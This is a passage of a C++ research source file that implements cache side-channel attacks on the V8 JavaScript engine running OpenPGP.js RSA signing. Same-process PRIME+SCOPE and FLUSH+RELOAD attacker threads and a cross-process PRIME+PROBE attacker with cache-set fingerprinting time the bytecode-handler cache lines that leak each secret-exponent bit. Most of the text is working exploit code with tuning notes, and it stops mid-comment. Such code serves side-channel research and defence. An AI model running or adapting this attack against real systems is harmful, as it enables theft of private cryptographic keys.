#include <pthread.h>
#include <sched.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>

#include "v8_runtime.h"

extern "C" {
#include "arch.h"
#include "cache.h"
#include "config.h"
#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "prime_probe.h"
#include "shared_memory.h"
}

/*
 * v8_constant_time_js  (same-process PRIME+SCOPE, à la v8_ecdh_thread_main)
 * =========================================================================
 * ONE process, two threads that share the address space:
 *   - main thread = victim: runs V8 and repeatedly executes the OpenPGP.js
 *     "constant-time" select; its mask (mask = -!!cond & 0xff) routes through
 *     the Negate / BitwiseAndSmi *bytecode handlers*. The heavy modexp
 *     arithmetic is JITed for speed; only select is pinned to the interpreter
 *     (%NeverOptimizeFunction + --no-sparkplug), so the handlers stay on its
 *     hot path.
 *   - attacker thread = PRIME+SCOPE monitor on cache lines of those two
 *     builtins, modeled on cpython_pow.c's FF_profile_pow but using SF
 *     eviction sets instead of clflush (see leapx02 note below).
 *
 * PRIME+SCOPE is used instead of real FLUSH+RELOAD because on this Ice
 * Lake-SP box (non-inclusive L3, SMT off) cross-core F+R on sparse code
 * accesses like these bytecode handlers only sees dense-access contention,
 * not a clean hit/miss signal -- prime+probe on SF eviction sets is required.
 * The eviction sets are built directly from the victim's builtin addresses
 * (both threads share one address space, so no CSI/cross-process fingerprint
 * scan is needed here, unlike the cross-process variant below). Pin the two
 * threads to different physical cores so the victim's fetch lands in the
 * shared LLC where the attacker's probe sees the eviction.
 *
 * The builtins are located via the JIT code-event enum-existing path (they load
 * at isolate creation and arrive as CODE_ADDED / JIT_CODE with an empty script
 * and a tag-prefixed name, e.g. "BytecodeHandler:NegateHandler"). enum-existing
 * is only used to find the builtins; the ongoing JIT events from the tiered-up
 * modexp are ignored (the handler is detached right after enumeration).
 *
 * scripts/compare_v8_gdb_trace.py identified the discriminating cache lines
 * (base-relative, hence invariant):
 *     NegateHandler            + 0x540   -> touched only when cond==true
 *     BitwiseAndSmiWideHandler + 0xf00   -> touched only when cond==false
 *
 * A third, non-discriminating line is also monitored as an EVENT MARKER:
 * comparing gdb traces of a single ct_select(true) vs ct_select(false) call
 * (dumps/v8_gdb_trace/ct_select_{true,false}.log) for cache lines hit exactly
 * once in BOTH traces at the same address turned up ReturnHandler's entry
 * (base + 0x0) -- the whole builtin fires exactly once, branch-independent,
 * right as select() returns. It carries no secret bit itself; it is used as
 * a per-call boundary pulse to denoise cl0/cl1 (e.g. segmenting the hit
 * stream into per-iteration windows instead of a single run-wide count).
 */

enum { cache_line_count = 3, profile_iterations = 1 << 16 };

static const char *test_name = "v8_constant_time_js";

static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];

/* Same-process PRIME+SCOPE eviction sets, built directly from the victim's
 * builtin addresses (shared address space -> no CSI needed). */
static EVSet *ps_evsets[cache_line_count];
static evchain *ps_chains[cache_line_count];

/* Resolved runtime instruction-starts of the three monitored builtins. */
static uintptr_t addr_negate = 0;
static uintptr_t addr_bitand = 0;
static uintptr_t addr_return = 0; /* cl2: event marker (see header comment) */

/* Monitored line within each builtin (base-relative). */
static const uint64_t builtin_line_off[cache_line_count] = {
	0x540, /* cl0: NegateHandler            -> true branch        */
	0xf00, /* cl1: BitwiseAndSmiWideHandler -> false branch       */
	0x0,   /* cl2: ReturnHandler            -> per-call marker    */
};
static uintptr_t target_addr[cache_line_count];

static const uint64_t max_exec_cycles = (uint64_t)5e10;

static const int victim_runs = 100;
/* Sized to keep ~6 FR polls per bit period T, same ratio as before the
 * BigInteger.select() casting reduction: T dropped from ~2.99e7 cyc/bit
 * (three toBytes/fromBytes round trips per iteration) to ~2.0e7 (one, via
 * select()'s own toUint8Array/BigInteger(bytes) conversions) -- measured via
 * evaluation/extract_v8_ct_rsa.py's per-trace T on a fresh F+R capture, not
 * guessed. 5e6 (~6 polls/bit at the old T) was leaving only ~4 polls/bit at
 * the new T, which measurably increased phase-slip outlier drops (1/20 ->
 * 4/20 in one back-to-back comparison); 3.3e6 restores ~6 polls/bit. */
static const uint64_t fr_wait_cycles = 3.3e6;

/* Same-process attack primitive: PRIME+SCOPE (default, uses ps_evsets below)
 * or real FLUSH+RELOAD (-fr flag, uses target_addr directly). Both threads
 * share one address space either way, so FLUSH+RELOAD needs no eviction set:
 * the builtin code the victim fetches is the same virtual address this
 * thread flushes/reloads. */
static bool use_flush_reload = false;

/* Unprofiled signs run before profiling so every non-select function (the
 * openpgp bundle, emsaEncode, bnSign, modExp, toBytes/fromBytes, hashing) tiers
 * up to TurboFan and stops executing the Negate / BitwiseAndSmi bytecode
 * handlers. select is pinned to the interpreter (%NeverOptimizeFunction +
 * --no-sparkplug), so after warmup it is the ONLY code touching those handlers,
 * which is what makes the profiled cache-line pattern clean. */
static const int warmup_runs = 3;

/* Match event->name (tag-prefixed, e.g. "BytecodeHandler:NegateHandler")
 * against a bare builtin name: strip up to and including the first ':' and
 * compare exactly so "NegateHandler" does not also catch "NegateWideHandler". */
static bool name_is(const v8::JitCodeEvent *event, const char *base) {
	const char *s = event->name.str;
	size_t len = event->name.len;
	for (size_t i = 0; i < len; ++i) {
		if (s[i] == ':') {
			s += i + 1;
			len -= i + 1;
			break;
		}
	}
	size_t blen = strlen(base);
	return len == blen && memcmp(s, base, blen) == 0;
}


static void jit_event_handler(const v8::JitCodeEvent *event) {
	if (event->type != v8::JitCodeEvent::CODE_ADDED) {
		return;
	}
	if (event->code_type != v8::JitCodeEvent::JIT_CODE) {
		return;
	}
	if (name_is(event, "NegateHandler")) {
		addr_negate = reinterpret_cast<uintptr_t>(event->code_start);
	} else if (name_is(event, "BitwiseAndSmiWideHandler")) {
		addr_bitand = reinterpret_cast<uintptr_t>(event->code_start);
	} else if (name_is(event, "ReturnHandler")) {
		addr_return = reinterpret_cast<uintptr_t>(event->code_start);
	}
}

/* The openpgp bundle is self-contained (no imports), so this is never called;
 * fail loudly if some other module tries to import a specifier. */
static v8::MaybeLocal<v8::Module> resolve_module(
    v8::Local<v8::Context> context,
    v8::Local<v8::String> specifier,
    v8::Local<v8::FixedArray> import_attributes,
    v8::Local<v8::Module> referrer) {
	(void)specifier;
	(void)import_attributes;
	(void)referrer;
	context->GetIsolate()->ThrowError(
	    "module imports are not supported by this embedder");
	return v8::MaybeLocal<v8::Module>();
}

/* Compile <source_str> as an ES module, evaluate it, and return its module
 * namespace (the object holding its exports). */
static v8::MaybeLocal<v8::Value> eval_module(v8::Local<v8::Context> context,
                                             const char *name,
                                             const char *source_str) {
	v8::Isolate *isolate = context->GetIsolate();
	v8::Local<v8::String> source =
	    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();
	v8::ScriptOrigin origin(v8::String::NewFromUtf8(isolate, name)
	                            .ToLocalChecked(),
	                        0,
	                        0,
	                        false,
	                        -1,
	                        v8::Local<v8::Value>(),
	                        false,
	                        false,
	                        true /* is_module */);
	v8::ScriptCompiler::Source module_source(source, origin);
	v8::Local<v8::Module> module;
	if (!v8::ScriptCompiler::CompileModule(isolate, &module_source)
	         .ToLocal(&module)) {
		return {};
	}
	if (module->InstantiateModule(context, resolve_module).IsNothing()) {
		return {};
	}
	v8::Local<v8::Value> result;
	if (!module->Evaluate(context).ToLocal(&result)) {
		return {};
	}
	isolate->PerformMicrotaskCheckpoint();
	return module->GetModuleNamespace();
}

/* Attacker thread: one PRIME+SCOPE window per victim run, gated so the window
 * is exactly one repeat call (victim flips the action to PAUSE when done). One
 * thread probes both builtin lines: the ~30M-cycle bit period leaves ample room
 * to scope both evsets each loop. Records only detected evictions (scope access
 * above the L2 threshold, below the interrupt threshold), packed per line, so
 * the trace matches the same on-disk trace format the flush+reload extractor
 * already reads (schema-compatible; the primitive itself is prime+scope). */
static void *v8_attacker_thread(void *arg) {
	(void)arg;
	log_info("attacker cl0 (Negate+0x%lx)  target=%p evset=%p",
	         builtin_line_off[0], (void *)target_addr[0], (void *)ps_evsets[0]);
	log_info("attacker cl1 (BitAnd+0x%lx) target=%p evset=%p",
	         builtin_line_off[1], (void *)target_addr[1], (void *)ps_evsets[1]);
	log_info("attacker cl2 (Return+0x%lx) target=%p evset=%p (marker)",
	         builtin_line_off[2], (void *)target_addr[2], (void *)ps_evsets[2]);

	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("attacker: failed to start helper thread");
		return nullptr;
	}
	uint8_t *scope[cache_line_count];
	for (int cl = 0; cl < cache_line_count; ++cl) {
		scope[cl] = ps_evsets[cl]->addrs[0];
	}
	i64 threshold = detected_cache_lats.l2_thresh;

	for (int r = 0; r < victim_runs; ++r) {
		uint32_t idx[cache_line_count] = { 0 };
		for (int cl = 0; cl < cache_line_count; ++cl) {
			prime_skx_sf_evset_ps_flush(
			    ps_evsets[cl], ps_chains[cl], array_repeat, l2_repeat);
		}

		pthread_barrier_wait(sync_ctx.barrier); /* A: release victim repeat */
		u64 end, t0 = rdtscp(), t1 = t0;
		u32 aux;
		do {
			for (int cl = 0; cl < cache_line_count; ++cl) {
				u64 scope_lat = _time_maccess_aux(scope[cl], end, aux);
				if ((i64)scope_lat > threshold) {
					if (scope_lat <
					        (u64)detected_cache_lats.interrupt_thresh &&
					    idx[cl] < profile_iterations) {
						sample_tsc[cl][idx[cl]] = rdtscp();
						reload_time[cl][idx[cl]] = scope_lat;
						++idx[cl];
					}
					prime_skx_sf_evset_ps_flush(
					    ps_evsets[cl], ps_chains[cl], array_repeat, l2_repeat);
				}
			}
			t1 = rdtscp();
		} while ((idx[0] < profile_iterations || idx[1] < profile_iterations ||
		          idx[2] < profile_iterations) &&
		         sync_ctx_get_action() == SYNC_CTX_START &&
		         (t1 - t0) < max_exec_cycles);

		pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */

		log_info("run %d/%d: cl0 %u cl1 %u cl2 %u evictions",
		         r + 1, victim_runs, idx[0], idx[1], idx[2]);
		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      reload_time,
		                      cache_line_count,
		                      profile_iterations,
		                      r == 0);
		memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
		memset(reload_time_arr, 0, sizeof(reload_time_arr));
	}
	stop_helper_thread(&hctrl);
	return nullptr;
}

/* Attacker thread: one FLUSH+RELOAD window per victim run, same gating as
 * v8_attacker_thread above. Real clflush+timed_access directly on
 * target_addr[cl] -- no evset needed, since both threads share one address
 * space and the address the victim fetches is the address this thread
 * flushes/reloads. A FAST reload (access_time <= threshold) means the victim
 * touched the line since the last flush -- the inverse polarity of
 * PRIME+SCOPE, where a SLOW scope access means the victim evicted it. */
static void *v8_attacker_thread_fr(void *arg) {
	(void)arg;
	log_info("attacker(FR) cl0 (Negate+0x%lx)  target=%p",
	         builtin_line_off[0], (void *)target_addr[0]);
	log_info("attacker(FR) cl1 (BitAnd+0x%lx) target=%p",
	         builtin_line_off[1], (void *)target_addr[1]);
	log_info("attacker(FR) cl2 (Return+0x%lx) target=%p (marker)",
	         builtin_line_off[2], (void *)target_addr[2]);

	static const i64 fr_hit_thresh = 260;
	i64 threshold = fr_hit_thresh;

	for (int r = 0; r < victim_runs; ++r) {
		uint32_t idx[cache_line_count] = { 0 };
		for (int cl = 0; cl < cache_line_count; ++cl) {
			clflush((volatile void *)target_addr[cl]);
		}

		pthread_barrier_wait(sync_ctx.barrier); /* A: release victim repeat */
		u64 t0 = rdtscp(), t1 = t0;
		do {
			FR_wait(fr_wait_cycles);
			for (int cl = 0; cl < cache_line_count; ++cl) {
				u64 access_time = timed_access((void *)target_addr[cl]);
				if ((i64)access_time <= threshold &&
				    idx[cl] < profile_iterations) {
					sample_tsc[cl][idx[cl]] = rdtscp();
					reload_time[cl][idx[cl]] = access_time;
					++idx[cl];
				}
				clflush((volatile void *)target_addr[cl]);
			}
			t1 = rdtscp();
		} while ((idx[0] < profile_iterations || idx[1] < profile_iterations ||
		          idx[2] < profile_iterations) &&
		         sync_ctx_get_action() == SYNC_CTX_START &&
		         (t1 - t0) < max_exec_cycles);

		pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */

		log_info("run %d/%d: cl0 %u cl1 %u cl2 %u hits",
		         r + 1, victim_runs, idx[0], idx[1], idx[2]);
		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      reload_time,
		                      cache_line_count,
		                      profile_iterations,
		                      r == 0);
		memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
		memset(reload_time_arr, 0, sizeof(reload_time_arr));
	}
	return nullptr;
}

/* Real key, relative to the project root -- both the same-process
 * v8_ct_thread_main below and the cross-process attacker's csi_set_key (see
 * ct_probe_keys further down) sign with this. */
static const char *ct_attack_key =
	"experiments/v8_constant_time_js/rsa_key_d_alt.json";
/* SET_KEY template (see js/openpgp_ct_set_key_template.js): a printf format
 * string with one %s for the absolute key path, evaluated to set
 * globalThis.ctKey. Same convention the cross-process victim uses. */
static const char *ct_set_key_template_path =
	"experiments/v8_constant_time_js/js/openpgp_ct_set_key_template.js";

int v8_ct_thread_main(int argc, char *argv[]) {
	reset_sync_ctx(V8_PROJ_ID);

	const char *source_str = read_file(argv[1]);
	const char *repeat_str = read_file(argv[2]);
	if (!source_str || !repeat_str) {
		log_error("could not read source/repeat scripts");
		return 1;
	}

	/* This .cc owns the key path, same as the cross-process victim: build the
	 * absolute path to ct_attack_key and read the SET_KEY template
	 * (js/openpgp_ct_set_key_template.js) that turns it into
	 * `globalThis.ctKey = JSON.parse(read('<path>'))`. repeat.js only ever
	 * reads globalThis.ctKey -- it has no path of its own. */
	config_t *cfg = get_config();
	char key_path[512];
	snprintf(key_path,
	         sizeof(key_path),
	         "%s/%s",
	         cfg->project_root,
	         ct_attack_key);
	log_info("attack key: %s", key_path);

	char key_template_path[512];
	snprintf(key_template_path,
	         sizeof(key_template_path),
	         "%s/%s",
	         cfg->project_root,
	         ct_set_key_template_path);
	const char *key_template_str = read_file(key_template_path);
	if (!key_template_str) {
		log_error("could not read SET_KEY template %s", key_template_path);
		return 1;
	}
	char key_script[4096];
	snprintf(key_script, sizeof(key_script), key_template_str, key_path);

	/* Let the heavy modexp arithmetic (BigInt modmul, toBytes/fromBytes) tier up
	 * to TurboFan so a sign runs in seconds, but keep the constant-time `select`
	 * in the Ignition interpreter: the eval bundle marks it with
	 * %NeverOptimizeFunction(select) (needs --allow-natives-syntax), and
	 * --no-sparkplug keeps it out of the baseline tier too, so its
	 * mask = (-!!cond) & 0xff keeps executing through the Negate / BitwiseAndSmi
	 * bytecode handlers that the PRIME+SCOPE attacker traces.
	 *
	 * --always-turbofan optimizes every other function on its first run (it still
	 * honors %NeverOptimizeFunction, so select is untouched), so a couple of
	 * warmup signs are enough to get all the non-select code (emsaEncode, the
	 * bundle helpers, ...) off the bytecode handlers -- otherwise interpreted
	 * `& 0xff` / unary `-` elsewhere would pollute the two monitored lines. */
	v8::V8::SetFlagsFromString(
	    "--allow-natives-syntax --no-sparkplug --always-turbofan");
	v8::V8::InitializeICUDefaultLocation(argv[0]);
	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);
	int rc = 0;
	{
		v8::Isolate::Scope iscope(isolate);
		v8::HandleScope scope(isolate);
		v8::TryCatch try_catch(isolate);

		/* Enumerate existing code objects to locate the builtins. */
		isolate->SetJitCodeEventHandler(
		    static_cast<v8::JitCodeEventOptions>(
		        v8::kJitCodeEventDefault | v8::kJitCodeEventEnumExisting),
		    jit_event_handler);
		isolate->SetJitCodeEventHandler(v8::kJitCodeEventDefault, nullptr);

		v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
		global->Set(
		    isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
		global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
		global->Set(isolate,
		            "readbuffer",
		            v8::FunctionTemplate::New(isolate, ReadBuffer));
		global->Set(
		    isolate, "print", v8::FunctionTemplate::New(isolate, Print));
		v8::Local<v8::Context> context =
		    v8::Context::New(isolate, nullptr, global);
		v8::Context::Scope cscope(context);

		log_info("V8 runtime load source module");
		v8::Local<v8::Value> ns;
		v8::Local<v8::Script> repeat_script;
		v8::Local<v8::Value> repeat_result;
		bool repeat_ok = false;
		if (eval_module(context, "openpgp_source", source_str).ToLocal(&ns)) {
			/* Expose the module's exports (crypto, enums, ...) as a global so
			 * the classic repeat script reaches them via `openpgp.*`. */
			context->Global()
			    ->Set(context,
			          v8::String::NewFromUtf8Literal(isolate, "openpgp"),
			          ns)
			    .Check();
			/* Set globalThis.ctKey before repeat.js runs (it reads only that). */
			v8::Local<v8::String> key_src =
			    v8::String::NewFromUtf8(isolate, key_script).ToLocalChecked();
			v8::Local<v8::Script> key_compiled;
			bool key_ok = v8::Script::Compile(context, key_src)
			                  .ToLocal(&key_compiled) &&
			              !key_compiled->Run(context).IsEmpty();
			if (!key_ok) {
				log_error("failed to set globalThis.ctKey from %s", key_path);
			} else {
				/* repeat.js is a classic script that must evaluate to the
				 * function to profile (using globals `openpgp`, `read`,
				 * `rdtscp`, ...). */
				v8::Local<v8::String> repeat_src =
				    v8::String::NewFromUtf8(isolate, repeat_str)
				        .ToLocalChecked();
				repeat_ok =
				    v8::Script::Compile(context, repeat_src)
				        .ToLocal(&repeat_script) &&
				    repeat_script->Run(context).ToLocal(&repeat_result) &&
				    repeat_result->IsFunction();
			}
		}

		if (ns.IsEmpty()) {
			ReportException(isolate, &try_catch);
			log_error("failed to load source module");
			rc = 1;
		} else if (!repeat_ok) {
			ReportException(isolate, &try_catch);
			log_error("repeat script must evaluate to a function");
			rc = 1;
		} else if (!addr_negate || !addr_bitand || !addr_return) {
			log_error("builtin resolution failed: Negate=%p BitwiseAndSmi=%p "
			          "Return=%p",
			          (void *)addr_negate,
			          (void *)addr_bitand,
			          (void *)addr_return);
			rc = 1;
		} else {
			v8::Local<v8::Function> repeat_func =
			    repeat_result.As<v8::Function>();

			log_info(LOG_BOLD_ON
			         "NegateHandler=%p BitwiseAndSmiWideHandler=%p "
			         "ReturnHandler=%p" LOG_BOLD_OFF,
			         (void *)addr_negate,
			         (void *)addr_bitand,
			         (void *)addr_return);
			target_addr[0] = addr_negate + builtin_line_off[0];
			target_addr[1] = addr_bitand + builtin_line_off[1];
			target_addr[2] = addr_return + builtin_line_off[2];

			for (int cl = 0; cl < cache_line_count; ++cl) {
				sample_tsc[cl] = sample_tsc_arr[cl];
				reload_time[cl] = reload_time_arr[cl];
			}

			/* Warmup: run the sign unprofiled so the whole non-select path tiers
			 * up to TurboFan and stops touching the Negate / BitwiseAndSmi
			 * handlers. The repeat caches its message/hash after the first call,
			 * so warmup also pre-runs generateSessionKey/hash.digest -- leaving
			 * the profiled call to exercise only emsaEncode + modExp, whose only
			 * interpreter-resident code is select. */
			for (int i = 0; i < warmup_runs; ++i) {
				(void)repeat_func->Call(
				    context, context->Global(), 0, nullptr);
				isolate->PerformMicrotaskCheckpoint();
			}
			log_info("warmup done (%d unprofiled signs)", warmup_runs);

			/* cache_env_init populates detected_cache_lats (the L2/interrupt
			 * thresholds both primitives key off of) either way. PRIME+SCOPE
			 * additionally needs an eviction set per builtin line; FLUSH+RELOAD
			 * targets target_addr[cl] directly (shared address space) and skips
			 * this. */
			if (cache_env_init(1)) {
				log_error("failed to initialize cache env");
				rc = 1;
			} else if (!use_flush_reload) {
				helper_thread_ctrl ev_hctrl;
				if (start_helper_thread(&ev_hctrl)) {
					log_error("failed to start evset helper thread");
					rc = 1;
				} else {
					for (int cl = 0; cl < cache_line_count; ++cl) {
						ps_evsets[cl] = nullptr;
						for (int t = 0; t < 16 && !ps_evsets[cl]; ++t) {
							ps_evsets[cl] = prepare_evset(
							    (u8 *)target_addr[cl], &ev_hctrl);
						}
						if (!ps_evsets[cl]) {
							log_error("failed to build evset for cl%d (%p)",
							          cl, (void *)target_addr[cl]);
							rc = 1;
							break;
						}
						ps_chains[cl] =
						    evchain_build(ps_evsets[cl]->addrs, SF_ASSOC);
						log_info("cl%d evset=%p", cl, (void *)ps_evsets[cl]);
					}
					stop_helper_thread(&ev_hctrl);
				}
			}

			pthread_t attacker;
			void *(*attacker_fn)(void *) =
			    use_flush_reload ? v8_attacker_thread_fr : v8_attacker_thread;
			if (rc == 0 &&
			    pthread_create(&attacker, nullptr, attacker_fn, nullptr) != 0) {
				log_error("failed to start attacker thread");
				rc = 1;
			} else if (rc == 0) {
				log_info("victim ready to start");
				for (int r = 0; r < victim_runs; ++r) {
					sync_ctx_set_action(SYNC_CTX_START);
					log_info("victim wait barrier");
					pthread_barrier_wait(sync_ctx.barrier); /* A */
					log_info("victim wait barrier done");
					(void)repeat_func->Call(
					    context, context->Global(), 0, nullptr);
					log_info("victim call done");
					isolate->PerformMicrotaskCheckpoint();
					sync_ctx_set_action(SYNC_CTX_PAUSE);
					pthread_barrier_wait(sync_ctx.barrier); /* B */
				}
				pthread_join(attacker, nullptr);
			}
		}
	}

	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return rc;
}

/* ==========================================================================
 * Cross-process variant (separate attacker PROCESS), à la v8_ecdh_key_pool.cc
 * ==========================================================================
 * The victim and attacker are TWO processes that rendezvous through the
 * SysV-shared sync_ctx (init/reset_sync_ctx + its process-shared barrier).
 * Because the two builtins live in the shared read-only .text of the
 * (statically-linked) V8 binary and their runtime address is randomized per
 * process, cross-core FLUSH+RELOAD on those sparse code lines only sees
 * contention (see the leapx02 note), so this attacker uses PRIME+PROBE on SF
 * eviction sets exactly like v8_ecdh_process_main.
 *
 *   victim process = the generic v8_rt (v8_run_loop), run with V8_MODULE_SOURCE=1
 *       so it loads the openpgp ES module and exposes `openpgp`; it resolves
 *       NegateHandler / BitwiseAndSmiWideHandler via the enum-existing JIT pass
 *       and publishes {jit_mul, Negate, BitAnd} in sync_ctx.data. It signs with
 *       globalThis.ctKey; SET_KEY runs its set-keypair template to load a key
 *       JSON (the ones/msb/alt probes, then the real key), START runs one sign.
 *   attacker process (-attacker): reads the two builtin bases (data[1],[2]),
 *       then -- because a bare virtual address only pins the page slot, not the
 *       L3 slice -- LOCATES each target's L3 set with a CSI fingerprint scan
 *       (v8_ct_csi): for every candidate set at the right page slot it drives
 *       the victim through the three probe keys and matches the per-line hit
 *       density, exactly like v8_ecdh_csi. Once both sets are found it
 *       prime+probes the two lines while driving the real key.
 *
 * CSI fingerprint (probe order ones, msb, alt): the secret d selects the
 * select() branch bit-by-bit, so d=0xff..(ones)=true every iter, d=0x80..(msb)=
 * false every iter, d=0xaa..(alt)=both alternating:
 *     cl0 = NegateHandler+off    (TRUE branch):  active, no_hit, active
 *     cl1 = BitwiseAndSmiWide+off (FALSE branch): no_hit, active, active
 *
 * sync_ctx.barrier is a 2-party barrier, so only the attacker's lead probe
 * thread (slot0, run inline in the driver) touches it; the second line (slot1)
 * is a helper thread synchronized through pp_local_barrier. During the CSI scan
 * only slot0 runs, so a single line is profiled at a time.
 *
 * This cross-process attacker only ever monitors the two DISCRIMINATING lines
 * (Negate/BitAnd) -- the third same-process marker line (cl2, ReturnHandler)
 * has no counterpart published by v8_run_loop and is not part of this mode.
 * Deliberately uses its own xproc_cache_line_count (2), not the same-process
 * cache_line_count (3), so the arrays/loops below stay correct unmodified. */

enum { xproc_cache_line_count = 2 };

static const int xproc_victim_runs = 100;
/* One openpgp RSA sign is ~15e9 cycles (~6s); the window closes early on the
 * victim's PAUSE, so this is only a safety cap and MUST exceed one full sign
 * (1e8, copied from the fast ecdh derive, truncated each capture to ~0.5% of
 * the sign -> near-empty traces). Match csi_max_exec_cycles / the F+R path. */
static const uint64_t pp_max_exec_cycles = (uint64_t)6e10;

static uint64_t pp_sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t pp_probe_time_arr[cache_line_count][profile_iterations];
static uint64_t *pp_sample_tsc[cache_line_count];
static uint64_t *pp_probe_time[cache_line_count];
static EVSet *pp_evsets[cache_line_count];
static evchain *pp_chains[cache_line_count];
static pthread_barrier_t pp_local_barrier;

/* CSI (cache-set identification) probe repeat scripts, relative to the project
 * root; each hardcodes a d that drives the select() branch a known way:
 *   [0] ones (d=0xff..) -> TRUE  branch every iter
 *   [1] msb  (d=0x80..) -> FALSE branch every iter (one TRUE at the top bit)
 *   [2] alt  (d=0xaa..) -> TRUE/FALSE alternating */
enum { csi_probe_count = 3 };
static const char *ct_probe_keys[csi_probe_count] = {
	"experiments/v8_constant_time_js/rsa_key_d_ones.json",
	"experiments/v8_constant_time_js/rsa_key_d_msb.json",
	"experiments/v8_constant_time_js/rsa_key_d_alt.json",
};

/* One sign is ~seconds; the CSI window closes on the victim's PAUSE, so this is
 * only a safety timeout (must comfortably exceed one sign). */
static const uint64_t csi_max_exec_cycles = (uint64_t)6e10;

/* Count-ratio fingerprint thresholds (leapx02-tunable): a candidate matches a
 * line when its dominant probe key is clearly active, the opposite key is ~gone,
 * and alt lands in between (both branches taken every other iteration). These
 * are relative so they survive without a precise per-iteration cycle count. */
static const int csi_min_active_hits = 80;
static const double csi_absent_ratio = 0.30;
static const double csi_alt_lo_ratio = 0.20;
static const double csi_alt_hi_ratio = 0.95;

/* cl0 = Negate/TRUE  -> ones dominant; cl1 = BitAnd/FALSE -> msb dominant. */
static int csi_line_matches(int cl, int c_ones, int c_msb, int c_alt) {
	int dom = (cl == 0) ? c_ones : c_msb;
	int other = (cl == 0) ? c_msb : c_ones;
	if (dom < csi_min_active_hits) {
		return 0;
	}
	if ((double)other > (double)dom * csi_absent_ratio) {
		return 0;
	}
	if ((double)c_alt < (double)dom * csi_alt_lo_ratio) {
		return 0;
	}
	if ((double)c_alt > (double)dom * csi_alt_hi_ratio) {
		return 0;
	}
	return 1;
}

/* Prime+probe one window on the slot's SF evset, recording every eviction (an
 * L2+ latency below the interrupt threshold) into pp_{sample_tsc,probe_time}.
 * The window closes when the victim flips the action away from START. */
static uint32_t pp_profile_window(int slot) {
	EVSet *evset = pp_evsets[slot];
	evchain *chain = pp_chains[slot];
	uint8_t *scope = evset->addrs[0];
	i64 threshold = detected_cache_lats.l2_thresh;
	u64 tsc0, tsc1, end, scope_lat;
	u32 aux, index = 0;

	prime_skx_sf_evset_ps_flush(evset, chain, array_repeat, l2_repeat);
	tsc0 = tsc1 = rdtscp();
	do {
		tsc1 = rdtscp();
		scope_lat = _time_maccess_aux(scope, end, aux);
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				pp_probe_time[slot][index] = scope_lat;
				pp_sample_tsc[slot][index] = tsc1;
				++index;
			}
			prime_skx_sf_evset_ps_flush(
			    evset, chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < pp_max_exec_cycles && index < profile_iterations &&
	         sync_ctx_get_action() == SYNC_CTX_START);
	return index;
}

/* Second probe line: never touches sync_ctx.barrier (that is slot0's job);
 * arms and closes each window through the attacker-local barrier. */
static void *pp_slot1_thread(void *arg) {
	(void)arg;
	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("slot1: failed to start helper thread");
		return nullptr;
	}
	for (int r = 0; r < xproc_victim_runs; ++r) {
		pthread_barrier_wait(&pp_local_barrier); /* A': arm */
		(void)pp_profile_window(1);
		pthread_barrier_wait(&pp_local_barrier); /* B': window closed */
	}
	stop_helper_thread(&hctrl);
	return nullptr;
}

/* CSI single-line profile: drive ONE victim sign (issue START, open the window,
 * profile until the victim flips to PAUSE) on a single candidate evset. Returns
 * the number of evictions seen -- the raw material for the fingerprint. The
 * victim must already have the desired probe key loaded (SET_KEY beforehand). */
static uint32_t csi_profile_once(EVSet *evset, evchain *chain) {
	uint8_t *scope = evset->addrs[0];
	i64 threshold = detected_cache_lats.l2_thresh;
	u64 tsc0, tsc1, end, scope_lat;
	u32 aux, index = 0;

	prime_skx_sf_evset_ps_flush(evset, chain, array_repeat, l2_repeat);
	tsc0 = tsc1 = rdtscp();
	sync_ctx_set_action(SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier); /* A: release victim sign */
	do {
		tsc1 = rdtscp();
		scope_lat = _time_maccess_aux(scope, end, aux);
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				++index;
			}
			prime_skx_sf_evset_ps_flush(
			    evset, chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < csi_max_exec_cycles && index < profile_iterations &&
	         sync_ctx_get_action() == SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous victim */
	return index;
}

/* Ask the victim to load a key JSON (path in sync_ctx.data); the victim's
 * SET_KEY template reads it into globalThis.ctKey. Pairs with the victim's
 * SET_KEY branch (barrier A: hand off path; B: loaded). */
static void csi_set_key(const char *project_root, const char *rel_path) {
	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "%s/%s",
	         project_root,
	         rel_path);
	sync_ctx_set_action(SYNC_CTX_SET_KEY);
	pthread_barrier_wait(sync_ctx.barrier); /* A */
	pthread_barrier_wait(sync_ctx.barrier); /* B */
}

/* Locate the L3 set of each target line by fingerprinting. For every candidate
 * SF set whose page slot matches a target, drive the victim through the three
 * probe keys, count evictions per key, and match csi_line_matches(). Fills
